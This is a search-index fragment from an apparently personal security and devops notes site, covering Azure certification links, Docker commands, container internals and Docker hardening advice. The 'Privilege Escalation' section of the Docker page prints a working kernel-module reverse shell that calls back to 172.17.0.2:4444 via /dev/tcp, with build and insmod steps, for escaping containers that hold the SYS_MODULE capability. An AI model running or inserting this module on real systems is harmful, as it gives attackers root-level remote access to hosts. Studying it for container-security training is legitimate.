https://cloud-right.com/2019/07/multi-regional-azure-front-door https://docs.microsoft.com/en-us/azure/architecture/reference-architectures/containers/aks/secure-baseline-aks","title":"AZ500"},{"location":"cloud/azuer-o360/#az900","text":"Regions Every region has a pair region for DR purposes Region have multiple data centers Availability Zones deploy your VM\u2019s into different data centers within the same region VM\u2019s are spread across different buildings but within same Azure Region Availability Sets increase the availability of your Applications VM would be spread across update and fault domains but it could happen that your Azure VM is running within the same building in outage your VM may go down https://www.testpreptraining.com/microsoft-azure-fundamentals-az-900-free-practice-test https://www.certlibrary.com/exam/AZ-900 https://www.exam-answer.com/microsoft/az-900 https://pegacert.com/vendor/microsoft/az-900 https://www.itexams.com/exam/AZ-900","title":"AZ900"},{"location":"cloud/general/","text":"Tools Multi-cloud OSINT tool. Enumerate public resources in AWS, Azure, and Google Cloud: https://github.com/initstring/cloud_enum Multi-Cloud Security Auditing Tool: https://github.com/nccgroup/ScoutSuite References Breaching the Cloud Perimeter Training: https://www.blackhillsinfosec.com/training/breaching-the-cloud-perimeter-training/","title":"General"},{"location":"cloud/general/#tools","text":"Multi-cloud OSINT tool. Enumerate public resources in AWS, Azure, and Google Cloud: https://github.com/initstring/cloud_enum Multi-Cloud Security Auditing Tool: https://github.com/nccgroup/ScoutSuite","title":"Tools"},{"location":"cloud/general/#references","text":"Breaching the Cloud Perimeter Training: https://www.blackhillsinfosec.com/training/breaching-the-cloud-perimeter-training/","title":"References"},{"location":"devops/CKAD/","text":"Core Concepts Configuration Multi-Container PODs Observability POD Design Services Networking State Persistance Certification Tips","title":"CKAD"},{"location":"devops/CKAD/#core-concepts","text":"","title":"Core Concepts"},{"location":"devops/CKAD/#configuration","text":"","title":"Configuration"},{"location":"devops/CKAD/#multi-container-pods","text":"","title":"Multi-Container PODs"},{"location":"devops/CKAD/#observability","text":"","title":"Observability"},{"location":"devops/CKAD/#pod-design","text":"","title":"POD Design"},{"location":"devops/CKAD/#services-networking","text":"","title":"Services &amp; Networking"},{"location":"devops/CKAD/#state-persistance","text":"","title":"State Persistance"},{"location":"devops/CKAD/#certification-tips","text":"","title":"Certification Tips"},{"location":"devops/container/","text":"Docker Docker Internals: https://docker-saigon.github.io/post/Docker-Internals/ https://www.netmanias.com/en/post/blog/13392/sdn-nfv/docker-internals https://medium.com/@BeNitinAgarwal/understanding-the-docker-internals-7ccb052ce9fe https://medium.com/@cwgem/docker-internals-through-docker-run-d1935356ced bretfisher Courses - Docker Mastery: https://www.bretfisher.com/courses/ petclinic example: https://github.com/BretFisher/petclinic https://github.com/BretFisher/dockercon19 At DockerCon: \"Captains on Deck\u201d hosted by Bret Fisher: https://docker.events.cube365.net/docker/dockercon/content/Videos/jFNDwpTbHotrtbt5x Reduced linux capabilities Security Options ( docker info - security options ) AppArmor profile enabled by default (Ubuntu) ( / etc / apparmor . d / docker ) if you have AppArmor running SELinux easily enabled (CentOS) by --selinux-enabled Seccomp profile enabled by default. Docker - ContainterD / (cri-o only in k8s) DO not expose Docker TCP socket, without securing using certificates. It's possible to use SSH (ssh://user@host) DOCKER_HOST = ssh : // user @host docker version Build with one base image, copy it to next base image after the initial work is done (within single Dockerfile): https://github.com/BretFisher/petclinic/blob/master/pet-clinic-app/Dockerfile Tools script that checks for dozens of common best-practices around deploying Docker containers in production: https://github.com/docker/docker-bench-security General Commands Mount host file system into a container and run: docker run --rm -ti -v /:/hostOs image sh Auto remove container when exit: docker run --rm List all images: docker images --all Version info: docker version Connect with remote: docker context Enumeration Check presence of docker: / . dockerenv Tools binctr Create fully static, including rootfs embedded, binaries that pop you directly into a container. Can be run by an unprivileged user. https://github.com/genuinetools/binctr https://blog.ropnop.com/docker-for-pentesters/ CVE-2019-5736 https://kubernetes.io/blog/2019/02/11/runc-and-cve-2019-5736/ https://gist.github.com/singe/0ad4078848d85dc0d03f9f9013796e45 New References Security analysis of Docker containers in a production environment Cryptojacking invades cloud. How modern containerization trend is exploited by attackers","title":"Container"},{"location":"devops/container/#docker","text":"Docker Internals: https://docker-saigon.github.io/post/Docker-Internals/ https://www.netmanias.com/en/post/blog/13392/sdn-nfv/docker-internals https://medium.com/@BeNitinAgarwal/understanding-the-docker-internals-7ccb052ce9fe https://medium.com/@cwgem/docker-internals-through-docker-run-d1935356ced bretfisher Courses - Docker Mastery: https://www.bretfisher.com/courses/ petclinic example: https://github.com/BretFisher/petclinic https://github.com/BretFisher/dockercon19 At DockerCon: \"Captains on Deck\u201d hosted by Bret Fisher: https://docker.events.cube365.net/docker/dockercon/content/Videos/jFNDwpTbHotrtbt5x Reduced linux capabilities Security Options ( docker info - security options ) AppArmor profile enabled by default (Ubuntu) ( / etc / apparmor . d / docker ) if you have AppArmor running SELinux easily enabled (CentOS) by --selinux-enabled Seccomp profile enabled by default. Docker - ContainterD / (cri-o only in k8s) DO not expose Docker TCP socket, without securing using certificates. It's possible to use SSH (ssh://user@host) DOCKER_HOST = ssh : // user @host docker version Build with one base image, copy it to next base image after the initial work is done (within single Dockerfile): https://github.com/BretFisher/petclinic/blob/master/pet-clinic-app/Dockerfile Tools script that checks for dozens of common best-practices around deploying Docker containers in production: https://github.com/docker/docker-bench-security","title":"Docker"},{"location":"devops/container/#general-commands","text":"Mount host file system into a container and run: docker run --rm -ti -v /:/hostOs image sh Auto remove container when exit: docker run --rm List all images: docker images --all Version info: docker version Connect with remote: docker context","title":"General Commands"},{"location":"devops/container/#enumeration","text":"Check presence of docker: / . dockerenv","title":"Enumeration"},{"location":"devops/container/#tools","text":"","title":"Tools"},{"location":"devops/container/#binctr","text":"Create fully static, including rootfs embedded, binaries that pop you directly into a container. Can be run by an unprivileged user. https://github.com/genuinetools/binctr https://blog.ropnop.com/docker-for-pentesters/","title":"binctr"},{"location":"devops/container/#cve-2019-5736","text":"https://kubernetes.io/blog/2019/02/11/runc-and-cve-2019-5736/ https://gist.github.com/singe/0ad4078848d85dc0d03f9f9013796e45","title":"CVE-2019-5736"},{"location":"devops/container/#new-references","text":"Security analysis of Docker containers in a production environment Cryptojacking invades cloud. How modern containerization trend is exploited by attackers","title":"New References"},{"location":"devops/docker/","text":"Quick Reference Open Container Spec - Labels: https://github.com/opencontainers/runtime-spec Add labels at end - so that full image build is not required to change Manage images download an image from DockerHub: docker image pull image name list all local images: docker image ls Chapter 5 build an image with a tag (note the dot!): docker image build - t image name publish an image to dockerhub: docker image push image name tag an image - either alias an exisiting image or apply a :tag to one: docker image tag image id tag name Manage Containers run a container from an image, publishing the specified ports: docker container run - p public port : container port image name list all containers, even the stopped ones: docker container ls - a stop a running container: docker container stop container id restart a stopped container: docker container start container id remove a stopped container: docker container rm container id remove all stopped containers: docker container prune run a container with interactive terminal: docker container run - it image name run a container detached (or in a daemon like way): docker container run - d image name run a command in a container: docker container exec - it container id command special form of the above, runs a bash shell, connected to your local terminal (your distro needs to have bash, alpine will require /bin/sh): docker container exec - it container id bash Follow the log (STDIN/System.out) of the container: docker container logs - f container id Take a snapshot image of a container: docker container commit - a author container id image name Pause: docker pause Unpause: docker unpause Manage your (local) Virtual Machine Find the IP address of your VirtualMachine, required for Docker Toolbox users only: docker - machine ip Manage Networks list all networks (bridge/host/none/etc.): docker network ls create a network using the bridge driver: docker network create network name Inspect the complete network: docket network inspect network name Link two containers (this is legacy): docker container run ... --link container-name-to-link-with image-name New way of linking two containers (using Docker Compose is easier): sudo docker network create mynetwork sudo docker container run ... --network mynetwork image-name Manage Volumes list all volumes: docker volume ls delete all volumes that are not currently mounted to a container: docker volume prune inspect a volume (can find out the mount point, the location of the volume on the host system) docker volume inspect volume name remove a volume: docker volume rm volume name Docker Compose process the default docker-compose.yaml file, starting any containers as required. If containers are already running they are ignored, meaning this command also serves as a \"redeploy\": docker - compose up run containers in the detached state. Note the order of the command line arguments!: docker - compose up - d follow the log for the specified service. Omit the -f to tail the log: docker - compose logs - f service name stop all the containers (services) listed in the default compose file: docker - compose down Validation: docker - compose config Images: docker - compose images Processes: docker - compose top Pause: docker - compose pause Unpause: docker - compose unpause Manage a Swarm Switch the machine into Swarm mode. We didn't cover how to stop swarm mode: docker swarm leave --force: docker swarm init ( --advertise-addr ip address ) Start a service in the swarm. The args are largely the same as those you will have used in docker container run: docker service create args Create a network suitable for using in a swarm: docker network create --driver overlay name List all services: docker service ls List all nodes in the swarm: docker node ls Follow the log for the service. This feature is a new feature in Docker and may not be available on your version (especially if using Linux Repository Packages): docker service logs - f service name List full details of the service - in particular the node on which it is running and any previous failed containers from the service: docker service ps service name Get a join token to enable a new node to connect to the swarm, either as a worker or manager: docker swarm join - token worker | manager Manage Stacks list all stacks on this swarm: docker stack ls deploy (or re-deploy) a stack based on a standard compose file: docker stack deploy - c compose file stack name delete a stack and its corresponding services/networks/etc: docker stack rm stack name System Disk usage docker system df Events docker system events System wide information docker system info Remove unused ata docker system prune Statistics Container statistics docker stats id Internals History Chroot circa 1982 FreeBSD Jails circa 2000 Solaris Zones circa 2004 Meiosys - MetaClusters with Checkpoint/Restore 2004-05 Linux OpenVZ circa 2005 (not in mainstream Linux) AIX WPARs circa 2007 LXC circa 2008 Systemd-nspawn circa 2010-2013 Docker circa 2013 built on LXC moved to libcontainer (March 2014) appC (CoreOS) announced (December 2014) Open Containers standard for convergence with Docker Announced (June 2015) moved to runC (OCF compliant) (July 2015) Namespaces References Namespaces in operation, part 1: namespaces overview Namespaces in operation, part 2: the namespaces API Namespaces in operation, part 3: PID namespaces Namespaces in operation, part 4: more on PID namespaces Namespaces in operation, part 5: User namespaces Namespaces in operation, part 6: more on user namespaces Namespaces in operation, part 7: Network namespaces Mount namespaces and shared subtrees Mount namespaces, mount propagation, and unbindable mounts A deep dive into Linux namespaces Demystifying namespaces and containers in Linux Separation Anxiety: A Tutorial for Isolating Your System with Linux Namespaces Syscalls clone() creating a namespace int clone ( int ( * child_func )( void * ), void * child_stack , int flags , void * arg ); is more general version of fork () If one of the CLONE_NEW* bits is specified in the call, then a new namespace of the corresponding type is created, and the new process is made a member of that namespace setns() Keeping a namespace open when it contains no processes disassociates the calling process from one instance of a particular namespace type and reassociates the process with another instance of the same namespace type int setns ( int fd , int nstype ); usable to join a given ns and execute command there unshare() creates the new namespaces specified by the CLONE_NEW* bits in its flags argument and makes the caller a member of the namespaces main purpose is to isolate namespace (and other) side effects without having to create a new process or thread (as is done by clone()). clone (..., CLONE_NEWXXX , ....); ~= if ( fork () == 0 ) unshare ( CLONE_NEWXXX ) ; Syscalls use constants: CLONE_NEWIPC CLONE_NEWN CLONE_NEWNET CLONE_NEWPID CLONE_NEWUSER CLONE_NEWUTS / proc / PID / ns directory that contains one file for each type of namespace Demo Separation with Docker: https://www.netmanias.com/en/post/blog/13392/sdn-nfv/docker-internals cgroups http://docker-saigon.github.io/post/Docker-Internals/#how:cb6baf67dddd3a71c07abfd705dc7d4b allow you to do accounting on resources used by processes a little bit of access control on device nodes and other things such as freezing groups of processes Managing with Systemd Set ControlGroupAttribute ControlGroupAttribute = memory . swappiness 70 systemctl set - property group CPUShares = 512 systemctl show group Internals: mkdir / sys / fs / cgroup / memory / somegroup / subcgroup Move process: echo $ PID / sys / fs / cgroup / ... / tasks cgroups consist of one hierarchy (tree) per resource (cpu, memory, \u2026). can create sub groups for each hierarchy. cpu memory \u251c\u2500\u2500 batch \u251c\u2500\u2500 109 \u2502 \u251c\u2500\u2500 hadoop \u251c\u2500\u2500 88 \u2502 \u2502 \u251c\u2500\u2500 88 \u251c\u2500\u2500 25 \u2502 \u2502 \u2514\u2500\u2500 109 \u251c\u2500\u2500 26 \u2514\u2500\u2500 realtime \u2514\u2500\u2500 databases \u251c\u2500\u2500 nginx \u251c\u2500\u2500 1008 \u2502 \u251c\u2500\u2500 25 \u2514\u2500\u2500 524 \u2502 \u2514\u2500\u2500 26 \u251c\u2500\u2500 postgres \u2502 \u251c\u2500\u2500 524 \u2514\u2500\u2500 redis \u2514\u2500\u2500 1008 memory accounting file pages: loaded from disk (can be discarded since it's anyway in the disk) anonymous pages: memory that does not correspond to anything on disk 2 pools for all pages: Active Inactive pages limits Hard limits: If the group goes above its hard limit, the group gets killed Soft limits: not enforced. except when the system starts to run out of memory. The more a process goes over its soft limit, the higher the chance pages get reclaimed for its group Kind of memories the limit can be applied: physical memory kernel memory: to avoid processes abusing the kernel to allocate memory total memory oom-notifier - mechanism to give control to a user program to handle a group going over its limits by freezing the processes in the group and notifying user space Overhead - Each time the kernel gives or takes a page to or from a process, counters are updated. CPU cgroup allows to set weights - not limits (On an idle host a container with low shares will still be able to use 100% of the CPU) CPUSet cgroup Bind group to specific CPU For: Real Time applications NUMA systems with localized memory per CPU BlkIO cgroup Measure Limit amount of blckIO by group net_cls and net_prio cgroup traffic control Devices cgroup Controls which group can read/write access devices. Usually containers access: /dev/{tty,zero,random,null} / dev / net / tun if you want to do anything with vpn\u2019s inside a container without polluting the host / dev / fuse custom filesystems in a container / dev / kvm to allow virtual machines to run inside a container / dev / dri / dev / video for GPU access in containers - (see NVIDIA/nvidia-docker). Freezer cgroup Freeze a whole group without sending SIGSTOP/SIGCONT to the group notifications IPTables (networking) Virtual switches in the linux kernel Linux Bridge is a kernel module Administered using the brctl Network shaping and bandwidth control for Linux containers: tc Demo using two hosts at: http://docker-saigon.github.io/post/Docker-Internals/#how:cb6baf67dddd3a71c07abfd705dc7d4b Linux bridges IPtable rules: brctl show sudo iptables - nvL port has been opened for each port exposed: ss - an | grep LISTEN userland docker-proxy process: ps - Af | grep proxy Memory usage by these proxies: ps - o pid , % cpu , % mem , sz , vsz , cmd - A --sort -%mem | grep proxy Name resolution: docker exec host2 cat / etc / resolv . conf DNS process injected into the container: docker exec - it host2 netstat - an exposing additional ports: forward packets from port 8001 on your host to port 8000 on the container: iptables -t nat -A DOCKER -p tcp --dport 8001 -j DNAT --to-destination ${ CONTAINER_IP } :8000 cgroup setup: sudo systemd - cgls Union File Systems (UnionFS) - AUFS, btrfs, vfs, and devicemapper Docker engine prepares the rootfs uses chroot for the container filesystem isolation (similar to LXC) Storage plugins: https://docs.docker.com/storage/storagedriver/ OverlayFS (CoreOS) AUFS (Ubuntu) device mapper (RHEL) btrfs (next-gen RHEL) ZFS (next-gen Ubuntu releases) Union File Systems provide the following features for storage: Layering Copy-On-Write significantly speed up the preparation of the rootfs LXC would create a full copy of FileSystem when creating a container Caching Diffing Container Runtimes: http://docker-saigon.github.io/post/Docker-Internals/ LXC https://www.hastexo.com/blogs/florian/2016/02/21/containers-just-because-everyone-else/ Systemd-nspawn https://chimeracoder.github.io/docker-without-docker/#18 https://github.com/Fewbytes/rubber-docker https://docs.google.com/presentation/d/10vFQfEUvpf7qYyksNqiy-bAxcy-bvF0OnUElCOtTTRc/edit#slide=id.g1012f66722_0_8 runC Security Considerations Image Authenticity Use Private or Trusted Repositories DockerHub Paid Plan has: scanning service Use Docker Content Trust: https://docs.docker.com/engine/security/trust/content_trust/ use digital signatures for data sent to and received from remote Docker registries image publishers can sign their images image consumers can ensure that the images they pull are signed keys an offline key that is the root of DCT for an image tag repository or tagging keys that sign tags server-managed keys such as the timestamp key, which provides freshness security guarantees for your repository Docker Bench Security: https://github.com/docker/docker-bench-security CIS Docker 1.13 Benchmark checks: https://benchmarks.cisecurity.org/tools2/docker/CIS_Docker_1.13.0_Benchmark_v1.0.0.pdf Excess Privileges capsh to view capabilities Do not run with --privileged (Don\u2019t use privileged containers unless you treat them the same way you treat any other process running as root. http://obrown.io/2016/02/15/privileged-containers.html ) Drop Unnecessary Privileges and Capabilities https://docs.docker.com/engine/security/security/ https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities System Security - SeLinux AppArmor .... Check linux/defense section Limit Available Resource Consumption https://docs.docker.com/engine/reference/run/#runtime-constraints-on-resources - m / --memory: Set a memory limit --memory-reservation: Set a soft memory limit --kernel-memory: Set a kernel memory limit --cpus: Limit the number of CPUs --device-read-bps: Limit the read rate from a device Large Attack Surfaces Implement an Audit Trail with Proper Logging When an application was deployed Who deployed it Why it was deployed What its intent is When it should be deprecated Implement alerting Tips Move dynamic steps to down to max utilization of cache Security References Docker vs. containerd vs. Nabla vs. Kata vs. Firecracker: https://www.inovex.de/blog/containers-docker-containerd-nabla-kata-firecracker/ Docker Production Best Practices from Bret Fisher at DockerCon: https://www.youtube.com/watch?v=V4f_sHTzvCI Docker Security Best Practices: https://blog.sqreen.com/docker-security/ 29 Docker security tools compared: https://sysdig.com/blog/20-docker-security-tools/ Docker Security Cheat Sheet: https://security.stackrox.com/rs/219-UEH-533/images/Docker-security-cheatsheet_final.pdf Docker security: https://docs.docker.com/engine/security/security/ BretFisher: What security concerns should I have with Docker? How should I go about locking it down? https://github.com/BretFisher/ama/issues/17 Shifting Docker security left: https://snyk.io/blog/shifting-docker-security-left/ At DockerCon: \"Building a Docker Image Packaging Pipeline Using GitHub Actions\": https://docker.events.cube365.net/docker/dockercon/content/Videos/SPWM3BdnCZWPN4fN9 At DockerCon: \"Your Container Has Vulnerabilities. Now What?\" https://docker.events.cube365.net/docker/dockercon/content/Videos/GZpzJAapdrSXohzNz Privilege Escalation \u200bCapabilities: capsh --print SYS_MODULE capability \u200b ip addr The call_usermodehelper function is used to create user mode processes from kernel space. The call_usermodehelper function takes three parameters: argv, envp and UMH_WAIT_EXEC The arguments to the program are stored in argv. The environment variables are stored in envp. UMH_WAIT_EXEC causes the kernel module to wait till the loader executes the program. Reference https://www.kernel.org/doc/htmldocs/kernel-api/API-call-usermodehelper.html Invoking user-space applications from the kernel: https://developer.ibm.com/articles/l-user-space-apps/ Usermode Helper API: https://insujang.github.io/2017-05-10/usermode-helper-api/ // reverse-shell.c #include linux/kmod.h #include linux/module.h MODULE_LICENSE ( GPL ); MODULE_AUTHOR ( AttackDefense ); MODULE_DESCRIPTION ( LKM reverse shell module ); MODULE_VERSION ( 1.0 ); char * argv [] = { /bin/bash , -c , bash -i /dev/tcp/172.17.0.2/4444 0 1 , NULL }; static char * envp [] = { PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin , NULL }; static int __init reverse_shell_init ( void ) { return call_usermodehelper ( argv [ 0 ], argv , envp , UMH_WAIT_EXEC ); } static void __exit reverse_shell_exit ( void ) { printk ( KERN_INFO Exiting \\n ); } module_init ( reverse_shell_init ); module_exit ( reverse_shell_exit ); # Makefile # make # \u200b insmod reverse-shell.ko obj-m += reverse-shell.o all : make -C /lib/modules/ $( shell uname -r ) /build M = $( PWD ) modules clean : make -C /lib/modules/ $( shell uname -r ) /build M = $( PWD ) clean","title":"Docker"},{"location":"devops/docker/#quick-reference","text":"Open Container Spec - Labels: https://github.com/opencontainers/runtime-spec Add labels at end - so that full image build is not required to change","title":"Quick Reference"},{"location":"devops/docker/#manage-images","text":"download an image from DockerHub: docker image pull image name list all local images: docker image ls Chapter 5 build an image with a tag (note the dot!): docker image build - t image name publish an image to dockerhub: docker image push image name tag an image - either alias an exisiting image or apply a :tag to one: docker image tag image id tag name","title":"Manage images"},{"location":"devops/docker/#manage-containers","text":"run a container from an image, publishing the specified ports: docker container run - p public port : container port image name list all containers, even the stopped ones: docker container ls - a stop a running container: docker container stop container id restart a stopped container: docker container start container id remove a stopped container: docker container rm container id remove all stopped containers: docker container prune run a container with interactive terminal: docker container run - it image name run a container detached (or in a daemon like way): docker container run - d image name run a command in a container: docker container exec - it container id command special form of the above, runs a bash shell, connected to your local terminal (your distro needs to have bash, alpine will require /bin/sh): docker container exec - it container id bash Follow the log (STDIN/System.out) of the container: docker container logs - f container id Take a snapshot image of a container: docker container commit - a author container id image name Pause: docker pause Unpause: docker unpause","title":"Manage Containers"},{"location":"devops/docker/#manage-your-local-virtual-machine","text":"Find the IP address of your VirtualMachine, required for Docker Toolbox users only: docker - machine ip","title":"Manage your (local) Virtual Machine"},{"location":"devops/docker/#manage-networks","text":"list all networks (bridge/host/none/etc.): docker network ls create a network using the bridge driver: docker network create network name Inspect the complete network: docket network inspect network name Link two containers (this is legacy): docker container run ... --link container-name-to-link-with image-name New way of linking two containers (using Docker Compose is easier): sudo docker network create mynetwork sudo docker container run ... --network mynetwork image-name","title":"Manage Networks"},{"location":"devops/docker/#manage-volumes","text":"list all volumes: docker volume ls delete all volumes that are not currently mounted to a container: docker volume prune inspect a volume (can find out the mount point, the location of the volume on the host system) docker volume inspect volume name remove a volume: docker volume rm volume name","title":"Manage Volumes"},{"location":"devops/docker/#docker-compose","text":"process the default docker-compose.yaml file, starting any containers as required. If containers are already running they are ignored, meaning this command also serves as a \"redeploy\": docker - compose up run containers in the detached state. Note the order of the command line arguments!: docker - compose up - d follow the log for the specified service. Omit the -f to tail the log: docker - compose logs - f service name stop all the containers (services) listed in the default compose file: docker - compose down Validation: docker - compose config Images: docker - compose images Processes: docker - compose top Pause: docker - compose pause Unpause: docker - compose unpause","title":"Docker Compose"},{"location":"devops/docker/#manage-a-swarm","text":"Switch the machine into Swarm mode. We didn't cover how to stop swarm mode: docker swarm leave --force: docker swarm init ( --advertise-addr ip address ) Start a service in the swarm. The args are largely the same as those you will have used in docker container run: docker service create args Create a network suitable for using in a swarm: docker network create --driver overlay name List all services: docker service ls List all nodes in the swarm: docker node ls Follow the log for the service. This feature is a new feature in Docker and may not be available on your version (especially if using Linux Repository Packages): docker service logs - f service name List full details of the service - in particular the node on which it is running and any previous failed containers from the service: docker service ps service name Get a join token to enable a new node to connect to the swarm, either as a worker or manager: docker swarm join - token worker | manager","title":"Manage a Swarm"},{"location":"devops/docker/#manage-stacks","text":"list all stacks on this swarm: docker stack ls deploy (or re-deploy) a stack based on a standard compose file: docker stack deploy - c compose file stack name delete a stack and its corresponding services/networks/etc: docker stack rm stack name","title":"Manage Stacks"},{"location":"devops/docker/#system","text":"Disk usage docker system df Events docker system events System wide information docker system info Remove unused ata docker system prune","title":"System"},{"location":"devops/docker/#statistics","text":"Container statistics docker stats id","title":"Statistics"},{"location":"devops/docker/#internals","text":"History Chroot circa 1982 FreeBSD Jails circa 2000 Solaris Zones circa 2004 Meiosys - MetaClusters with Checkpoint/Restore 2004-05 Linux OpenVZ circa 2005 (not in mainstream Linux) AIX WPARs circa 2007 LXC circa 2008 Systemd-nspawn circa 2010-2013 Docker circa 2013 built on LXC moved to libcontainer (March 2014) appC (CoreOS) announced (December 2014) Open Containers standard for convergence with Docker Announced (June 2015) moved to runC (OCF compliant) (July 2015) Namespaces References Namespaces in operation, part 1: namespaces overview Namespaces in operation, part 2: the namespaces API Namespaces in operation, part 3: PID namespaces Namespaces in operation, part 4: more on PID namespaces Namespaces in operation, part 5: User namespaces Namespaces in operation, part 6: more on user namespaces Namespaces in operation, part 7: Network namespaces Mount namespaces and shared subtrees Mount namespaces, mount propagation, and unbindable mounts A deep dive into Linux namespaces Demystifying namespaces and containers in Linux Separation Anxiety: A Tutorial for Isolating Your System with Linux Namespaces Syscalls clone() creating a namespace int clone ( int ( * child_func )( void * ), void * child_stack , int flags , void * arg ); is more general version of fork () If one of the CLONE_NEW* bits is specified in the call, then a new namespace of the corresponding type is created, and the new process is made a member of that namespace setns() Keeping a namespace open when it contains no processes disassociates the calling process from one instance of a particular namespace type and reassociates the process with another instance of the same namespace type int setns ( int fd , int nstype ); usable to join a given ns and execute command there unshare() creates the new namespaces specified by the CLONE_NEW* bits in its flags argument and makes the caller a member of the namespaces main purpose is to isolate namespace (and other) side effects without having to create a new process or thread (as is done by clone()). clone (..., CLONE_NEWXXX , ....); ~= if ( fork () == 0 ) unshare ( CLONE_NEWXXX ) ; Syscalls use constants: CLONE_NEWIPC CLONE_NEWN CLONE_NEWNET CLONE_NEWPID CLONE_NEWUSER CLONE_NEWUTS / proc / PID / ns directory that contains one file for each type of namespace Demo Separation with Docker: https://www.netmanias.com/en/post/blog/13392/sdn-nfv/docker-internals cgroups http://docker-saigon.github.io/post/Docker-Internals/#how:cb6baf67dddd3a71c07abfd705dc7d4b allow you to do accounting on resources used by processes a little bit of access control on device nodes and other things such as freezing groups of processes Managing with Systemd Set ControlGroupAttribute ControlGroupAttribute = memory . swappiness 70 systemctl set - property group CPUShares = 512 systemctl show group Internals: mkdir / sys / fs / cgroup / memory / somegroup / subcgroup Move process: echo $ PID / sys / fs / cgroup / ... / tasks cgroups consist of one hierarchy (tree) per resource (cpu, memory, \u2026). can create sub groups for each hierarchy. cpu memory \u251c\u2500\u2500 batch \u251c\u2500\u2500 109 \u2502 \u251c\u2500\u2500 hadoop \u251c\u2500\u2500 88 \u2502 \u2502 \u251c\u2500\u2500 88 \u251c\u2500\u2500 25 \u2502 \u2502 \u2514\u2500\u2500 109 \u251c\u2500\u2500 26 \u2514\u2500\u2500 realtime \u2514\u2500\u2500 databases \u251c\u2500\u2500 nginx \u251c\u2500\u2500 1008 \u2502 \u251c\u2500\u2500 25 \u2514\u2500\u2500 524 \u2502 \u2514\u2500\u2500 26 \u251c\u2500\u2500 postgres \u2502 \u251c\u2500\u2500 524 \u2514\u2500\u2500 redis \u2514\u2500\u2500 1008 memory accounting file pages: loaded from disk (can be discarded since it's anyway in the disk) anonymous pages: memory that does not correspond to anything on disk 2 pools for all pages: Active Inactive pages limits Hard limits: If the group goes above its hard limit, the group gets killed Soft limits: not enforced. except when the system starts to run out of memory. The more a process goes over its soft limit, the higher the chance pages get reclaimed for its group Kind of memories the limit can be applied: physical memory kernel memory: to avoid processes abusing the kernel to allocate memory total memory oom-notifier - mechanism to give control to a user program to handle a group going over its limits by freezing the processes in the group and notifying user space Overhead - Each time the kernel gives or takes a page to or from a process, counters are updated. CPU cgroup allows to set weights - not limits (On an idle host a container with low shares will still be able to use 100% of the CPU) CPUSet cgroup Bind group to specific CPU For: Real Time applications NUMA systems with localized memory per CPU BlkIO cgroup Measure Limit amount of blckIO by group net_cls and net_prio cgroup traffic control Devices cgroup Controls which group can read/write access devices. Usually containers access: /dev/{tty,zero,random,null} / dev / net / tun if you want to do anything with vpn\u2019s inside a container without polluting the host / dev / fuse custom filesystems in a container / dev / kvm to allow virtual machines to run inside a container / dev / dri / dev / video for GPU access in containers - (see NVIDIA/nvidia-docker). Freezer cgroup Freeze a whole group without sending SIGSTOP/SIGCONT to the group notifications IPTables (networking) Virtual switches in the linux kernel Linux Bridge is a kernel module Administered using the brctl Network shaping and bandwidth control for Linux containers: tc Demo using two hosts at: http://docker-saigon.github.io/post/Docker-Internals/#how:cb6baf67dddd3a71c07abfd705dc7d4b Linux bridges IPtable rules: brctl show sudo iptables - nvL port has been opened for each port exposed: ss - an | grep LISTEN userland docker-proxy process: ps - Af | grep proxy Memory usage by these proxies: ps - o pid , % cpu , % mem , sz , vsz , cmd - A --sort -%mem | grep proxy Name resolution: docker exec host2 cat / etc / resolv . conf DNS process injected into the container: docker exec - it host2 netstat - an exposing additional ports: forward packets from port 8001 on your host to port 8000 on the container: iptables -t nat -A DOCKER -p tcp --dport 8001 -j DNAT --to-destination ${ CONTAINER_IP } :8000 cgroup setup: sudo systemd - cgls Union File Systems (UnionFS) - AUFS, btrfs, vfs, and devicemapper Docker engine prepares the rootfs uses chroot for the container filesystem isolation (similar to LXC) Storage plugins: https://docs.docker.com/storage/storagedriver/ OverlayFS (CoreOS) AUFS (Ubuntu) device mapper (RHEL) btrfs (next-gen RHEL) ZFS (next-gen Ubuntu releases) Union File Systems provide the following features for storage: Layering Copy-On-Write significantly speed up the preparation of the rootfs LXC would create a full copy of FileSystem when creating a container Caching Diffing Container Runtimes: http://docker-saigon.github.io/post/Docker-Internals/ LXC https://www.hastexo.com/blogs/florian/2016/02/21/containers-just-because-everyone-else/ Systemd-nspawn https://chimeracoder.github.io/docker-without-docker/#18 https://github.com/Fewbytes/rubber-docker https://docs.google.com/presentation/d/10vFQfEUvpf7qYyksNqiy-bAxcy-bvF0OnUElCOtTTRc/edit#slide=id.g1012f66722_0_8 runC","title":"Internals"},{"location":"devops/docker/#security-considerations","text":"Image Authenticity Use Private or Trusted Repositories DockerHub Paid Plan has: scanning service Use Docker Content Trust: https://docs.docker.com/engine/security/trust/content_trust/ use digital signatures for data sent to and received from remote Docker registries image publishers can sign their images image consumers can ensure that the images they pull are signed keys an offline key that is the root of DCT for an image tag repository or tagging keys that sign tags server-managed keys such as the timestamp key, which provides freshness security guarantees for your repository Docker Bench Security: https://github.com/docker/docker-bench-security CIS Docker 1.13 Benchmark checks: https://benchmarks.cisecurity.org/tools2/docker/CIS_Docker_1.13.0_Benchmark_v1.0.0.pdf Excess Privileges capsh to view capabilities Do not run with --privileged (Don\u2019t use privileged containers unless you treat them the same way you treat any other process running as root. http://obrown.io/2016/02/15/privileged-containers.html ) Drop Unnecessary Privileges and Capabilities https://docs.docker.com/engine/security/security/ https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities System Security - SeLinux AppArmor .... Check linux/defense section Limit Available Resource Consumption https://docs.docker.com/engine/reference/run/#runtime-constraints-on-resources - m / --memory: Set a memory limit --memory-reservation: Set a soft memory limit --kernel-memory: Set a kernel memory limit --cpus: Limit the number of CPUs --device-read-bps: Limit the read rate from a device Large Attack Surfaces Implement an Audit Trail with Proper Logging When an application was deployed Who deployed it Why it was deployed What its intent is When it should be deprecated Implement alerting","title":"Security Considerations"},{"location":"devops/docker/#tips","text":"Move dynamic steps to down to max utilization of cache","title":"Tips"},{"location":"devops/docker/#security-references","text":"Docker vs. containerd vs. Nabla vs. Kata vs. Firecracker: https://www.inovex.de/blog/containers-docker-containerd-nabla-kata-firecracker/ Docker Production Best Practices from Bret Fisher at DockerCon: https://www.youtube.com/watch?v=V4f_sHTzvCI Docker Security Best Practices: https://blog.sqreen.com/docker-security/ 29 Docker security tools compared: https://sysdig.com/blog/20-docker-security-tools/ Docker Security Cheat Sheet: https://security.stackrox.com/rs/219-UEH-533/images/Docker-security-cheatsheet_final.pdf Docker security: 